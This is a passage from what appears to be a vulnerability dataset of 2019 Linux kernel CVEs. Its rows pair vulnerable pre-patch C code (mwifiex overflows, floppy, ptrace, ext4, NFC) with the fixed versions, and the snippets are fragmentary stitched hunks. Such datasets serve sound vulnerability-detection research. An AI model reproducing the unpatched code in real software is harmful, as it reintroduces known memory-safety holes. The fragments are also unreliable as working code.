 pr_warn(""[0000:00:00.0]:[%s:%d]: %pV"", func, line, &vaf);

ret:
 va_end(va);
{
 va_list va;
 struct va_format vaf;





 va_start(va, fmt);


 if (likely(qedi) && likely(qedi->pdev))
 pr_notice(""[%s]:[%s:%d]:%d: %pV"",
 dev_name(&qedi->pdev->dev), func, line,
			  qedi->host_no, &vaf);
 else
 pr_notice(""[0000:00:00.0]:[%s:%d]: %pV"", func, line, &vaf);

ret:
 va_end(va);
{
 va_list va;
 struct va_format vaf;





 va_start(va, fmt);


 if (likely(qedi) && likely(qedi->pdev))
 pr_info(""[%s]:[%s:%d]:%d: %pV"", dev_name(&qedi->pdev->dev),
 func, line, qedi->host_no, &vaf);
 else
 pr_info(""[0000:00:00.0]:[%s:%d]: %pV"", func, line, &vaf);

ret:
 va_end(va);
"
2019,#NAME?,CVE-2019-15031,,
2019,,CVE-2019-15030,,
2019,DoS Exec Code Overflow ,CVE-2019-14901,,
2019,,CVE-2019-14899,,
2020,DoS +Info ,CVE-2019-14898,,
2019,DoS Exec Code Overflow ,CVE-2019-14897,,
2019,DoS Exec Code Overflow ,CVE-2019-14896,,
2019,DoS Exec Code Overflow ,CVE-2019-14895,,
2019,Overflow ,CVE-2019-14835,,
2019,DoS ,CVE-2019-14821,,
2019,DoS Exec Code Overflow ,CVE-2019-14816,"		}

		vs_ie = (struct ieee_types_header *)vendor_ie;



 memcpy(ie->ie_buffer + le16_to_cpu(ie->ie_length),
		       vs_ie, vs_ie->len + 2);
 le16_unaligned_add_cpu(&ie->ie_length, vs_ie->len + 2);

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_SUPP_RATES, var_pos, len);
 if (rate_ie) {


 memcpy(bss_cfg->rates, rate_ie + 1, rate_ie->len);
		rate_len = rate_ie->len;
	}

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_EXT_SUPP_RATES,
					   params->beacon.tail,
					   params->beacon.tail_len);
 if (rate_ie)


 memcpy(bss_cfg->rates + rate_len, rate_ie + 1, rate_ie->len);


 return;
}
					    params->beacon.tail_len);
 if (vendor_ie) {
		wmm_ie = vendor_ie;


 memcpy(&bss_cfg->wmm_info, wmm_ie +
 sizeof(struct ieee_types_header), *(wmm_ie + 1));
		priv->wmm_enabled = 1;
","		}

		vs_ie = (struct ieee_types_header *)vendor_ie;
 if (le16_to_cpu(ie->ie_length) + vs_ie->len + 2 >
			IEEE_MAX_IE_SIZE)
 return -EINVAL;
 memcpy(ie->ie_buffer + le16_to_cpu(ie->ie_length),
		       vs_ie, vs_ie->len + 2);
 le16_unaligned_add_cpu(&ie->ie_length, vs_ie->len + 2);

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_SUPP_RATES, var_pos, len);
 if (rate_ie) {
 if (rate_ie->len > MWIFIEX_SUPPORTED_RATES)
 return;
 memcpy(bss_cfg->rates, rate_ie + 1, rate_ie->len);
		rate_len = rate_ie->len;
	}

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_EXT_SUPP_RATES,
					   params->beacon.tail,
					   params->beacon.tail_len);
 if (rate_ie) {
 if (rate_ie->len > MWIFIEX_SUPPORTED_RATES - rate_len)
 return;
 memcpy(bss_cfg->rates + rate_len, rate_ie + 1, rate_ie->len);
	}

 return;
}
					    params->beacon.tail_len);
 if (vendor_ie) {
		wmm_ie = vendor_ie;
 if (*(wmm_ie + 1) > sizeof(struct mwifiex_types_wmm_info))
 return;
 memcpy(&bss_cfg->wmm_info, wmm_ie +
 sizeof(struct ieee_types_header), *(wmm_ie + 1));
		priv->wmm_enabled = 1;
"
2019,Overflow ,CVE-2019-14815,"		}

		vs_ie = (struct ieee_types_header *)vendor_ie;



 memcpy(ie->ie_buffer + le16_to_cpu(ie->ie_length),
		       vs_ie, vs_ie->len + 2);
 le16_unaligned_add_cpu(&ie->ie_length, vs_ie->len + 2);

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_SUPP_RATES, var_pos, len);
 if (rate_ie) {


 memcpy(bss_cfg->rates, rate_ie + 1, rate_ie->len);
		rate_len = rate_ie->len;
	}

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_EXT_SUPP_RATES,
					   params->beacon.tail,
					   params->beacon.tail_len);
 if (rate_ie)


 memcpy(bss_cfg->rates + rate_len, rate_ie + 1, rate_ie->len);


 return;
}
					    params->beacon.tail_len);
 if (vendor_ie) {
		wmm_ie = vendor_ie;


 memcpy(&bss_cfg->wmm_info, wmm_ie +
 sizeof(struct ieee_types_header), *(wmm_ie + 1));
		priv->wmm_enabled = 1;
","		}

		vs_ie = (struct ieee_types_header *)vendor_ie;
 if (le16_to_cpu(ie->ie_length) + vs_ie->len + 2 >
			IEEE_MAX_IE_SIZE)
 return -EINVAL;
 memcpy(ie->ie_buffer + le16_to_cpu(ie->ie_length),
		       vs_ie, vs_ie->len + 2);
 le16_unaligned_add_cpu(&ie->ie_length, vs_ie->len + 2);

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_SUPP_RATES, var_pos, len);
 if (rate_ie) {
 if (rate_ie->len > MWIFIEX_SUPPORTED_RATES)
 return;
 memcpy(bss_cfg->rates, rate_ie + 1, rate_ie->len);
		rate_len = rate_ie->len;
	}

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_EXT_SUPP_RATES,
					   params->beacon.tail,
					   params->beacon.tail_len);
 if (rate_ie) {
 if (rate_ie->len > MWIFIEX_SUPPORTED_RATES - rate_len)
 return;
 memcpy(bss_cfg->rates + rate_len, rate_ie + 1, rate_ie->len);
	}

 return;
}
					    params->beacon.tail_len);
 if (vendor_ie) {
		wmm_ie = vendor_ie;
 if (*(wmm_ie + 1) > sizeof(struct mwifiex_types_wmm_info))
 return;
 memcpy(&bss_cfg->wmm_info, wmm_ie +
 sizeof(struct ieee_types_header), *(wmm_ie + 1));
		priv->wmm_enabled = 1;
"
2019,DoS Exec Code Overflow ,CVE-2019-14814,"		}

		vs_ie = (struct ieee_types_header *)vendor_ie;



 memcpy(ie->ie_buffer + le16_to_cpu(ie->ie_length),
		       vs_ie, vs_ie->len + 2);
 le16_unaligned_add_cpu(&ie->ie_length, vs_ie->len + 2);

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_SUPP_RATES, var_pos, len);
 if (rate_ie) {


 memcpy(bss_cfg->rates, rate_ie + 1, rate_ie->len);
		rate_len = rate_ie->len;
	}

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_EXT_SUPP_RATES,
					   params->beacon.tail,
					   params->beacon.tail_len);
 if (rate_ie)


 memcpy(bss_cfg->rates + rate_len, rate_ie + 1, rate_ie->len);


 return;
}
					    params->beacon.tail_len);
 if (vendor_ie) {
		wmm_ie = vendor_ie;


 memcpy(&bss_cfg->wmm_info, wmm_ie +
 sizeof(struct ieee_types_header), *(wmm_ie + 1));
		priv->wmm_enabled = 1;
","		}

		vs_ie = (struct ieee_types_header *)vendor_ie;
 if (le16_to_cpu(ie->ie_length) + vs_ie->len + 2 >
			IEEE_MAX_IE_SIZE)
 return -EINVAL;
 memcpy(ie->ie_buffer + le16_to_cpu(ie->ie_length),
		       vs_ie, vs_ie->len + 2);
 le16_unaligned_add_cpu(&ie->ie_length, vs_ie->len + 2);

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_SUPP_RATES, var_pos, len);
 if (rate_ie) {
 if (rate_ie->len > MWIFIEX_SUPPORTED_RATES)
 return;
 memcpy(bss_cfg->rates, rate_ie + 1, rate_ie->len);
		rate_len = rate_ie->len;
	}

	rate_ie = (void *)cfg80211_find_ie(WLAN_EID_EXT_SUPP_RATES,
					   params->beacon.tail,
					   params->beacon.tail_len);
 if (rate_ie) {
 if (rate_ie->len > MWIFIEX_SUPPORTED_RATES - rate_len)
 return;
 memcpy(bss_cfg->rates + rate_len, rate_ie + 1, rate_ie->len);
	}

 return;
}
					    params->beacon.tail_len);
 if (vendor_ie) {
		wmm_ie = vendor_ie;
 if (*(wmm_ie + 1) > sizeof(struct mwifiex_types_wmm_info))
 return;
 memcpy(&bss_cfg->wmm_info, wmm_ie +
 sizeof(struct ieee_types_header), *(wmm_ie + 1));
		priv->wmm_enabled = 1;
"
2019,,CVE-2019-14763,"	req->complete = f_hidg_req_complete;
	req->context  = hidg;



	status = usb_ep_queue(hidg->in_ep, req, GFP_ATOMIC);
 if (status < 0) {
 ERROR(hidg->func.config->cdev,
 ""usb_ep_queue error on int endpoint %zd\n"", status);
 goto release_write_pending_unlocked;
	} else {
		status = count;
	}
 spin_unlock_irqrestore(&hidg->write_spinlock, flags);

 return status;
release_write_pending:
 spin_lock_irqsave(&hidg->write_spinlock, flags);
release_write_pending_unlocked:
	hidg->write_pending = 0;
 spin_unlock_irqrestore(&hidg->write_spinlock, flags);

","	req->complete = f_hidg_req_complete;
	req->context  = hidg;

 spin_unlock_irqrestore(&hidg->write_spinlock, flags);

	status = usb_ep_queue(hidg->in_ep, req, GFP_ATOMIC);
 if (status < 0) {
 ERROR(hidg->func.config->cdev,
 ""usb_ep_queue error on int endpoint %zd\n"", status);
 goto release_write_pending;
	} else {
		status = count;
	}


 return status;
release_write_pending:
 spin_lock_irqsave(&hidg->write_spinlock, flags);

	hidg->write_pending = 0;
 spin_unlock_irqrestore(&hidg->write_spinlock, flags);

"
2019,DoS ,CVE-2019-14284,"	raw_cmd->kernel_data = floppy_track_buffer;
	raw_cmd->length = 4 * F_SECT_PER_TRACK;




 /* allow for about 30ms for data transport per track */
	head_shift = (F_SECT_PER_TRACK + 5) / 6;

 /* sanity checking for parameters. */
 if (g->sect <= 0 ||
	    g->head <= 0 ||


	    g->track <= 0 || g->track > UDP->tracks >> STRETCH(g) ||
 /* check if reserved bits are set */
	    (g->stretch & ~(FD_STRETCH | FD_SWAPSIDES | FD_SECTBASEMASK)) != 0)
","	raw_cmd->kernel_data = floppy_track_buffer;
	raw_cmd->length = 4 * F_SECT_PER_TRACK;

 if (!F_SECT_PER_TRACK)
 return;

 /* allow for about 30ms for data transport per track */
	head_shift = (F_SECT_PER_TRACK + 5) / 6;

 /* sanity checking for parameters. */
 if (g->sect <= 0 ||
	    g->head <= 0 ||
 /* check for zero in F_SECT_PER_TRACK */
	    (unsigned char)((g->sect << 2) >> FD_SIZECODE(g)) == 0 ||
	    g->track <= 0 || g->track > UDP->tracks >> STRETCH(g) ||
 /* check if reserved bits are set */
	    (g->stretch & ~(FD_STRETCH | FD_SWAPSIDES | FD_SECTBASEMASK)) != 0)
"
2019,Overflow ,CVE-2019-14283," int cnt;

 /* sanity checking for parameters. */
 if (g->sect <= 0 ||
	    g->head <= 0 ||


 /* check for zero in F_SECT_PER_TRACK */
	    (unsigned char)((g->sect << 2) >> FD_SIZECODE(g)) == 0 ||
	    g->track <= 0 || g->track > UDP->tracks >> STRETCH(g) ||
"," int cnt;

 /* sanity checking for parameters. */
 if ((int)g->sect <= 0 ||
	    (int)g->head <= 0 ||
 /* check for overflow in max_sector */
	    (int)(g->sect * g->head) <= 0 ||
 /* check for zero in F_SECT_PER_TRACK */
	    (unsigned char)((g->sect << 2) >> FD_SIZECODE(g)) == 0 ||
	    g->track <= 0 || g->track > UDP->tracks >> STRETCH(g) ||
"
2019,DoS ,CVE-2019-13648,,
2019,,CVE-2019-13631,,
2019,,CVE-2019-13272," */
static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
{
 rcu_read_lock();
 __ptrace_link(child, new_parent, __task_cred(new_parent));
 rcu_read_unlock();
}

/**
"," */
static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
{
 __ptrace_link(child, new_parent, current_cred());


}

/**
"
2019,,CVE-2019-13233,"}

/**
 * get_desc() - Obtain pointer to a segment descriptor

 * @sel:	Segment selector
 *
 * Given a segment selector, obtain a pointer to the segment descriptor.
 * Both global and local descriptor tables are supported.
 *
 * Returns:
 *
 * Pointer to segment descriptor on success.
 *
 * NULL on error.
 */
static struct desc_struct *get_desc(unsigned short sel)
{
 struct desc_ptr gdt_desc = {0, 0};
 unsigned long desc_base;

#ifdef CONFIG_MODIFY_LDT_SYSCALL
 if ((sel & SEGMENT_TI_MASK) == SEGMENT_LDT) {
 struct desc_struct *desc = NULL;
 struct ldt_struct *ldt;

 /* Bits [15:3] contain the index of the desired entry. */
		sel >>= 3;

 mutex_lock(&current->active_mm->context.lock);
		ldt = current->active_mm->context.ldt;
 if (ldt && sel < ldt->nr_entries)
			desc = &ldt->entries[sel];



 mutex_unlock(&current->active_mm->context.lock);

 return desc;
	}
#endif
 native_store_gdt(&gdt_desc);
	desc_base = sel & ~(SEGMENT_RPL_MASK | SEGMENT_TI_MASK);

 if (desc_base > gdt_desc.size)
 return NULL;

 return (struct desc_struct *)(gdt_desc.address + desc_base);

}

/**
 */
unsigned long insn_get_seg_base(struct pt_regs *regs, int seg_reg_idx)
{
 struct desc_struct *desc;
 short sel;

	sel = get_segment_selector(regs, seg_reg_idx);
 if (!sel)
 return -1L;

	desc = get_desc(sel);
 if (!desc)
 return -1L;

 return get_desc_base(desc);
}

/**
 */
static unsigned long get_seg_limit(struct pt_regs *regs, int seg_reg_idx)
{
 struct desc_struct *desc;
 unsigned long limit;
 short sel;

 if (!sel)
 return 0;

	desc = get_desc(sel);
 if (!desc)
 return 0;

 /*
	 * not tested when checking the segment limits. In practice,
	 * this means that the segment ends in (limit << 12) + 0xfff.
 */
	limit = get_desc_limit(desc);
 if (desc->g)
		limit = (limit << 12) + 0xfff;

 return limit;
 */
int insn_get_code_seg_params(struct pt_regs *regs)
{
 struct desc_struct *desc;
 short sel;

 if (v8086_mode(regs))
 if (sel < 0)
 return sel;

	desc = get_desc(sel);
 if (!desc)
 return -EINVAL;

 /*
	 * The most significant byte of the Type field of the segment descriptor
	 * determines whether a segment contains data or code. If this is a data
	 * segment, return error.
 */
 if (!(desc->type & BIT(3)))
 return -EINVAL;

 switch ((desc->l << 1) | desc->d) {
 case 0: /*
		 * Legacy mode. CS.L=0, CS.D=0. Address and operand size are
		 * both 16-bit.
","}

/**
 * get_desc() - Obtain contents of a segment descriptor
 * @out:	Segment descriptor contents on success
 * @sel:	Segment selector
 *
 * Given a segment selector, obtain a pointer to the segment descriptor.
 * Both global and local descriptor tables are supported.
 *
 * Returns:
 *
 * True on success, false on failure.
 *
 * NULL on error.
 */
static bool get_desc(struct desc_struct *out, unsigned short sel)
{
 struct desc_ptr gdt_desc = {0, 0};
 unsigned long desc_base;

#ifdef CONFIG_MODIFY_LDT_SYSCALL
 if ((sel & SEGMENT_TI_MASK) == SEGMENT_LDT) {
 bool success = false;
 struct ldt_struct *ldt;

 /* Bits [15:3] contain the index of the desired entry. */
		sel >>= 3;

 mutex_lock(&current->active_mm->context.lock);
		ldt = current->active_mm->context.ldt;
 if (ldt && sel < ldt->nr_entries) {
			*out = ldt->entries[sel];
			success = true;
		}

 mutex_unlock(&current->active_mm->context.lock);

 return success;
	}
#endif
 native_store_gdt(&gdt_desc);
	desc_base = sel & ~(SEGMENT_RPL_MASK | SEGMENT_TI_MASK);

 if (desc_base > gdt_desc.size)
 return false;

	*out = *(struct desc_struct *)(gdt_desc.address + desc_base);
 return true;
}

/**
 */
unsigned long insn_get_seg_base(struct pt_regs *regs, int seg_reg_idx)
{
 struct desc_struct desc;
 short sel;

	sel = get_segment_selector(regs, seg_reg_idx);
 if (!sel)
 return -1L;

 if (!get_desc(&desc, sel))

 return -1L;

 return get_desc_base(&desc);
}

/**
 */
static unsigned long get_seg_limit(struct pt_regs *regs, int seg_reg_idx)
{
 struct desc_struct desc;
 unsigned long limit;
 short sel;

 if (!sel)
 return 0;

 if (!get_desc(&desc, sel))

 return 0;

 /*
	 * not tested when checking the segment limits. In practice,
	 * this means that the segment ends in (limit << 12) + 0xfff.
 */
	limit = get_desc_limit(&desc);
 if (desc.g)
		limit = (limit << 12) + 0xfff;

 return limit;
 */
int insn_get_code_seg_params(struct pt_regs *regs)
{
 struct desc_struct desc;
 short sel;

 if (v8086_mode(regs))
 if (sel < 0)
 return sel;

 if (!get_desc(&desc, sel))

 return -EINVAL;

 /*
	 * The most significant byte of the Type field of the segment descriptor
	 * determines whether a segment contains data or code. If this is a data
	 * segment, return error.
 */
 if (!(desc.type & BIT(3)))
 return -EINVAL;

 switch ((desc.l << 1) | desc.d) {
 case 0: /*
		 * Legacy mode. CS.L=0, CS.D=0. Address and operand size are
		 * both 16-bit.
"
2019,DoS ,CVE-2019-12984,"	u32 device_idx, target_idx;
 int rc;

 if (!info->attrs[NFC_ATTR_DEVICE_INDEX])

 return -EINVAL;

	device_idx = nla_get_u32(info->attrs[NFC_ATTR_DEVICE_INDEX]);
","	u32 device_idx, target_idx;
 int rc;

 if (!info->attrs[NFC_ATTR_DEVICE_INDEX] ||
	    !info->attrs[NFC_ATTR_TARGET_INDEX])
 return -EINVAL;

	device_idx = nla_get_u32(info->attrs[NFC_ATTR_DEVICE_INDEX]);
"
2019,DoS ,CVE-2019-12819,"	err = device_register(&bus->dev);
 if (err) {
 pr_err(""mii_bus %s failed to register\n"", bus->id);
 put_device(&bus->dev);
 return -EINVAL;
	}

","	err = device_register(&bus->dev);
 if (err) {
 pr_err(""mii_bus %s failed to register\n"", bus->id);

 return -EINVAL;
	}

"
2019,DoS ,CVE-2019-12818,"						      sock->service_name,
						      sock->service_name_len,
						      &service_name_tlv_length);




		size += service_name_tlv_length;
	}


	miux_tlv = nfc_llcp_build_tlv(LLCP_TLV_MIUX, (u8 *)&miux, 0,
				      &miux_tlv_length);




	size += miux_tlv_length;

	rw_tlv = nfc_llcp_build_tlv(LLCP_TLV_RW, &rw, 0, &rw_tlv_length);




	size += rw_tlv_length;

 pr_debug(""SKB size %d SN length %zu\n"", size, sock->service_name_len);

	miux_tlv = nfc_llcp_build_tlv(LLCP_TLV_MIUX, (u8 *)&miux, 0,
				      &miux_tlv_length);




	size += miux_tlv_length;

	rw_tlv = nfc_llcp_build_tlv(LLCP_TLV_RW, &rw, 0, &rw_tlv_length);




	size += rw_tlv_length;

	skb = llcp_allocate_pdu(sock, LLCP_PDU_CC, size);

static int nfc_llcp_build_gb(struct nfc_llcp_local *local)
{
	u8 *gb_cur, *version_tlv, version, version_length;
	u8 *lto_tlv, lto_length;
	u8 *wks_tlv, wks_length;
 u8 *miux_tlv, miux_length;
	__be16 wks = cpu_to_be16(local->local_wks);
	u8 gb_len = 0;
 int ret = 0;

	version = LLCP_VERSION_11;
	version_tlv = nfc_llcp_build_tlv(LLCP_TLV_VERSION, &version,
 1, &version_length);




	gb_len += version_length;

	lto_tlv = nfc_llcp_build_tlv(LLCP_TLV_LTO, &local->lto, 1, &lto_length);




	gb_len += lto_length;

 pr_debug(""Local wks 0x%lx\n"", local->local_wks);
	wks_tlv = nfc_llcp_build_tlv(LLCP_TLV_WKS, (u8 *)&wks, 2, &wks_length);




	gb_len += wks_length;

	miux_tlv = nfc_llcp_build_tlv(LLCP_TLV_MIUX, (u8 *)&local->miux, 0,
				      &miux_length);




	gb_len += miux_length;

	gb_len += ARRAY_SIZE(llcp_magic);
","						      sock->service_name,
						      sock->service_name_len,
						      &service_name_tlv_length);
 if (!service_name_tlv) {
			err = -ENOMEM;
 goto error_tlv;
		}
		size += service_name_tlv_length;
	}


	miux_tlv = nfc_llcp_build_tlv(LLCP_TLV_MIUX, (u8 *)&miux, 0,
				      &miux_tlv_length);
 if (!miux_tlv) {
		err = -ENOMEM;
 goto error_tlv;
	}
	size += miux_tlv_length;

	rw_tlv = nfc_llcp_build_tlv(LLCP_TLV_RW, &rw, 0, &rw_tlv_length);
 if (!rw_tlv) {
		err = -ENOMEM;
 goto error_tlv;
	}
	size += rw_tlv_length;

 pr_debug(""SKB size %d SN length %zu\n"", size, sock->service_name_len);

	miux_tlv = nfc_llcp_build_tlv(LLCP_TLV_MIUX, (u8 *)&miux, 0,
				      &miux_tlv_length);
 if (!miux_tlv) {
		err = -ENOMEM;
 goto error_tlv;
	}
	size += miux_tlv_length;

	rw_tlv = nfc_llcp_build_tlv(LLCP_TLV_RW, &rw, 0, &rw_tlv_length);
 if (!rw_tlv) {
		err = -ENOMEM;
 goto error_tlv;
	}
	size += rw_tlv_length;

	skb = llcp_allocate_pdu(sock, LLCP_PDU_CC, size);

static int nfc_llcp_build_gb(struct nfc_llcp_local *local)
{
	u8 *gb_cur, version, version_length;
	u8 lto_length, wks_length, miux_length;
	u8 *version_tlv = NULL, *lto_tlv = NULL,
    *wks_tlv = NULL, *miux_tlv = NULL;
	__be16 wks = cpu_to_be16(local->local_wks);
	u8 gb_len = 0;
 int ret = 0;

	version = LLCP_VERSION_11;
	version_tlv = nfc_llcp_build_tlv(LLCP_TLV_VERSION, &version,
 1, &version_length);
 if (!version_tlv) {
		ret = -ENOMEM;
 goto out;
	}
	gb_len += version_length;

	lto_tlv = nfc_llcp_build_tlv(LLCP_TLV_LTO, &local->lto, 1, &lto_length);
 if (!lto_tlv) {
		ret = -ENOMEM;
 goto out;
	}
	gb_len += lto_length;

 pr_debug(""Local wks 0x%lx\n"", local->local_wks);
	wks_tlv = nfc_llcp_build_tlv(LLCP_TLV_WKS, (u8 *)&wks, 2, &wks_length);
 if (!wks_tlv) {
		ret = -ENOMEM;
 goto out;
	}
	gb_len += wks_length;

	miux_tlv = nfc_llcp_build_tlv(LLCP_TLV_MIUX, (u8 *)&local->miux, 0,
				      &miux_length);
 if (!miux_tlv) {
		ret = -ENOMEM;
 goto out;
	}
	gb_len += miux_length;

	gb_len += ARRAY_SIZE(llcp_magic);
"
2019,Overflow ,CVE-2019-12817,,
2019,DoS ,CVE-2019-12615,,
2019,DoS ,CVE-2019-12614,,
2019,DoS ,CVE-2019-12456,,
2019,DoS ,CVE-2019-12455,,
2019,,CVE-2019-12454,,
2019,DoS ,CVE-2019-12382,,
2019,DoS ,CVE-2019-12381,,
2019,,CVE-2019-12380,,
2019,,CVE-2019-12379,,
2019,DoS ,CVE-2019-12378,,
2019,#NAME?,CVE-2019-11884," sockfd_put(csock);
 return err;
		}


		err = hidp_connection_add(&ca, csock, isock);
 if (!err && copy_to_user(argp, &ca, sizeof(ca)))
"," sockfd_put(csock);
 return err;
		}
		ca.name[sizeof(ca.name)-1] = 0;

		err = hidp_connection_add(&ca, csock, isock);
 if (!err && copy_to_user(argp, &ca, sizeof(ca)))
"
2019,#NAME?,CVE-2019-11833,"	__le32 border;
 ext4_fsblk_t *ablocks = NULL; /* array of allocated blocks */
 int err = 0;


 /* make decision: where to split? */
 /* FIXME: now decision is simplest: at current extent */
 le16_add_cpu(&neh->eh_entries, m);
	}





 ext4_extent_block_csum_set(inode, neh);
 set_buffer_uptodate(bh);
 unlock_buffer(bh);
 sizeof(struct ext4_extent_idx) * m);
 le16_add_cpu(&neh->eh_entries, m);
		}





 ext4_extent_block_csum_set(inode, neh);
 set_buffer_uptodate(bh);
 unlock_buffer(bh);
 ext4_fsblk_t newblock, goal = 0;
 struct ext4_super_block *es = EXT4_SB(inode->i_sb)->s_es;
 int err = 0;


 /* Try to prepend new index to old one */
 if (ext_depth(inode))
 goto out;
	}


 /* move top-level index/leaf into new block */
 memmove(bh->b_data, EXT4_I(inode)->i_data,
 sizeof(EXT4_I(inode)->i_data));


 /* set size of new block */
	neh = ext_block_hdr(bh);
","	__le32 border;
 ext4_fsblk_t *ablocks = NULL; /* array of allocated blocks */
 int err = 0;
 size_t ext_size = 0;

 /* make decision: where to split? */
 /* FIXME: now decision is simplest: at current extent */
 le16_add_cpu(&neh->eh_entries, m);
	}

 /* zero out unused area in the extent block */
	ext_size = sizeof(struct ext4_extent_header) +
 sizeof(struct ext4_extent) * le16_to_cpu(neh->eh_entries);
 memset(bh->b_data + ext_size, 0, inode->i_sb->s_blocksize - ext_size);
 ext4_extent_block_csum_set(inode, neh);
 set_buffer_uptodate(bh);
 unlock_buffer(bh);
 sizeof(struct ext4_extent_idx) * m);
 le16_add_cpu(&neh->eh_entries, m);
		}
 /* zero out unused area in the extent block */
		ext_size = sizeof(struct ext4_extent_header) +
		   (sizeof(struct ext4_extent) * le16_to_cpu(neh->eh_entries));
 memset(bh->b_data + ext_size, 0,
			inode->i_sb->s_blocksize - ext_size);
 ext4_extent_block_csum_set(inode, neh);
 set_buffer_uptodate(bh);
 unlock_buffer(bh);
 ext4_fsblk_t newblock, goal = 0;
 struct ext4_super_block *es = EXT4_SB(inode->i_sb)->s_es;
 int err = 0;
 size_t ext_size = 0;

 /* Try to prepend new index to old one */
 if (ext_depth(inode))
 goto out;
	}

	ext_size = sizeof(EXT4_I(inode)->i_data);
 /* move top-level index/leaf into new block */
 memmove(bh->b_data, EXT4_I(inode)->i_data, ext_size);
 /* zero out unused area in the extent block */
 memset(bh->b_data + ext_size, 0, inode->i_sb->s_blocksize - ext_size);

 /* set size of new block */
	neh = ext_block_hdr(bh);
"
2019,,CVE-2019-11815," list_for_each_entry_safe(tc, _tc, &rds_tcp_conn_list, t_tcp_node) {
 struct net *c_net = read_pnet(&tc->t_cpath->cp_conn->c_net);

 if (net != c_net || !tc->t_sock)
 continue;
 if (!list_has_conn(&tmp_list, tc->t_cpath->cp_conn)) {
 list_move_tail(&tc->t_tcp_node, &tmp_list);
"," list_for_each_entry_safe(tc, _tc, &rds_tcp_conn_list, t_tcp_node) {
 struct net *c_net = read_pnet(&tc->t_cpath->cp_conn->c_net);

 if (net != c_net)
 continue;
 if (!list_has_conn(&tmp_list, tc->t_cpath->cp_conn)) {
 list_move_tail(&tc->t_tcp_node, &tmp_list);
"
2019,,CVE-2019-11811," WARN_ON(new_smi->io.dev->init_name != NULL);

 out_err:





 kfree(init_name);
 return rv;
}
 if (!addr)
 return -ENODEV;

	io->io_cleanup = mem_cleanup;

 /*
	 * Figure out the actual readb/readw/readl/etc routine to use based
	 * upon the register size.
 mem_region_cleanup(io, io->io_size);
 return -EIO;
	}



 return 0;
}
 if (!addr)
 return -ENODEV;

	io->io_cleanup = port_cleanup;

 /*
	 * Figure out the actual inb/inw/inl/etc routine to use based
	 * upon the register size.
 return -EIO;
		}
	}



 return 0;
}
"," WARN_ON(new_smi->io.dev->init_name != NULL);

 out_err:
 if (rv && new_smi->io.io_cleanup) {
		new_smi->io.io_cleanup(&new_smi->io);
		new_smi->io.io_cleanup = NULL;
	}

 kfree(init_name);
 return rv;
}
 if (!addr)
 return -ENODEV;



 /*
	 * Figure out the actual readb/readw/readl/etc routine to use based
	 * upon the register size.
 mem_region_cleanup(io, io->io_size);
 return -EIO;
	}

	io->io_cleanup = mem_cleanup;

 return 0;
}
 if (!addr)
 return -ENODEV;



 /*
	 * Figure out the actual inb/inw/inl/etc routine to use based
	 * upon the register size.
 return -EIO;
		}
	}

	io->io_cleanup = port_cleanup;

 return 0;
}
"
2019,DoS ,CVE-2019-11810," if (megasas_create_frame_pool(instance)) {
 dev_printk(KERN_DEBUG, &instance->pdev->dev, ""Error creating frame DMA pool\n"");
 megasas_free_cmds(instance);

	}

 return 0;
"," if (megasas_create_frame_pool(instance)) {
 dev_printk(KERN_DEBUG, &instance->pdev->dev, ""Error creating frame DMA pool\n"");
 megasas_free_cmds(instance);
 return -ENOMEM;
	}

 return 0;
"
2019,DoS Mem. Corr. ,CVE-2019-11683,,
2019,DoS +Info ,CVE-2019-11599,"		 * will only be one mm, so no big deal.
 */
 down_write(&mm->mmap_sem);


 mutex_lock(&ufile->umap_lock);
 list_for_each_entry_safe (priv, next_priv, &ufile->umaps,
					  list) {
			vma->vm_flags &= ~(VM_SHARED | VM_MAYSHARE);
		}
 mutex_unlock(&ufile->umap_lock);

 up_write(&mm->mmap_sem);
 mmput(mm);
	}
					count = -EINTR;
 goto out_mm;
				}


















 for (vma = mm->mmap; vma; vma = vma->vm_next) {
					vma->vm_flags &= ~VM_SOFTDIRTY;
 vma_set_page_prot(vma);

 /* the various vma->vm_userfaultfd_ctx still points to it */
 down_write(&mm->mmap_sem);


 for (vma = mm->mmap; vma; vma = vma->vm_next)
 if (vma->vm_userfaultfd_ctx.ctx == release_new_ctx) {
				vma->vm_userfaultfd_ctx = NULL_VM_UFFD_CTX;
	 * taking the mmap_sem for writing.
 */
 down_write(&mm->mmap_sem);


	prev = NULL;
 for (vma = mm->mmap; vma; vma = vma->vm_next) {
 cond_resched();
		vma->vm_flags = new_flags;
		vma->vm_userfaultfd_ctx = NULL_VM_UFFD_CTX;
	}

 up_write(&mm->mmap_sem);
 mmput(mm);
wakeup:
 goto out;

 down_write(&mm->mmap_sem);


	vma = find_vma_prev(mm, start, &prev);
 if (!vma)
 goto out_unlock;
 goto out;

 down_write(&mm->mmap_sem);


	vma = find_vma_prev(mm, start, &prev);
 if (!vma)
 goto out_unlock;
 __mmdrop(mm);
}






















/**
 * mmget() - Pin the address space associated with a &struct mm_struct.
 * @mm: The address space to pin.
#include <linux/moduleparam.h>
#include <linux/pkeys.h>
#include <linux/oom.h>


#include <linux/uaccess.h>
#include <asm/cacheflush.h>
	vma = find_vma_prev(mm, addr, &prev);
 if (vma && (vma->vm_start <= addr))
 return vma;
 if (!prev || expand_stack(prev, addr))

 return NULL;
 if (prev->vm_flags & VM_LOCKED)
 populate_vma_page_range(prev, addr, prev->vm_end, NULL);
 return vma;
 if (!(vma->vm_flags & VM_GROWSDOWN))
 return NULL;



	start = vma->vm_start;
 if (expand_stack(vma, addr))
 return NULL;
","		 * will only be one mm, so no big deal.
 */
 down_write(&mm->mmap_sem);
 if (!mmget_still_valid(mm))
 goto skip_mm;
 mutex_lock(&ufile->umap_lock);
 list_for_each_entry_safe (priv, next_priv, &ufile->umaps,
					  list) {
			vma->vm_flags &= ~(VM_SHARED | VM_MAYSHARE);
		}
 mutex_unlock(&ufile->umap_lock);
	skip_mm:
 up_write(&mm->mmap_sem);
 mmput(mm);
	}
					count = -EINTR;
 goto out_mm;
				}
 /*
